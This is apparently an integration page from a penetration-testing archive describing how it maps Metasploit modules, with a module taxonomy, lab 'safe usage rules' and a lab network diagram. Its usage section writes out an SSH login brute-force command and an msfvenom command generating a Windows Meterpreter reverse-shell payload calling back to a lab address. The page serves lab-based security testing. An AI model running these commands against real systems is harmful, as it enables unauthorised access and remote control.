# Metasploit Framework Engine

| Field | Value |
|---|---|
| `engine_id` | ENG-MSF |
| `source` | rapid7/metasploit-framework @ 2026.01-rc1 |
| `license` | BSD-3-Clause |
| `architecture` | data / scanner / exploit / auxiliary / post / evasion / payload |
| `upstream_ref` | `00-governance/manifests/source-repos.lock.json` |

## 1. What the archive stores versus what it references

The archive does **not** vendor the Metasploit source. It stores:

1. A **module index** (`modules/modules-index.csv`) for search and crosswalk.
2. **Binding tables** mapping archive payloads to Metasploit modules.
3. **Hardening guidance** for running the framework inside a lab.
4. **Crosswalk rows** into `04-evasion/` and `06-defense/`.

Rationale: the framework is a 400 MB moving target; pinning it as a submodule
is the only sustainable integration, and the archive's value is the *mapping*.

## 2. Module taxonomy

| Type | Prefix | Purpose | Archive home |
|---|---|---|---|
| auxiliary | `auxiliary/` | scanning, enumeration, protocol abuse | `01-intel/playbooks/network/` |
| exploit | `exploit/` | initial access, code execution | `02-payloads/` |
| payload | `payload/` | staged shellcode by transport | `04-evasion/` |
| post | `post/` | lateral movement, privesc, harvesting | `04-evasion/` |
| evasion | `evasion/` | anti-forensics and AV bypass | `04-evasion/` |
| nop | `nop/` | shellcode generation scaffolding | `07-tooling/` |
| encoder | `encoder/` | payload encoding | `07-tooling/cyberchef/` |

## 3. Safe usage rules

```bash
# ALWAYS in an isolated lab
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS lab.rhosts; run; exit"

# Stage a reverse shell in the lab
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 \
         -o /tmp/lab-stage.bin
```

| Rule | Why |
|---|---|
| Never `exploit/multi/handler` against production | Data loss, breach |
| Set `HttpClientTimeout`, `ExploitRetries` low | Stability |
| Use `-o` output capture for evidence | `01-intel/checklists/penetration-testing-checklist.md` |
| Log every command with `set LogLevel 3` + session logging | Audit trail |
| Regenerate the module index after each upgrade | Crosswalk integrity |

## 4. Lab isolation

```
            +-----------------------+
  host-only | lab bridge (wireguard) |  10.10.10.0/24
            +-----------+-----------+
                        |
        +---------------+----------------+
        |               |                |
  +-----v-----+  +------v------+  +------v------+
  |  attacker |  |   target    |  |   domain    |
  |   Kali    |  |   DVWA/JSP  |  |   AD lab    |
  +-----------+  +-------------+  +-------------+
```

* Lab definition: `09-labs/infrastructure/`
* Expected telemetry per module: `05-engines/metasploit/modules/modules-index.csv`
  (`expected_sigma` column).
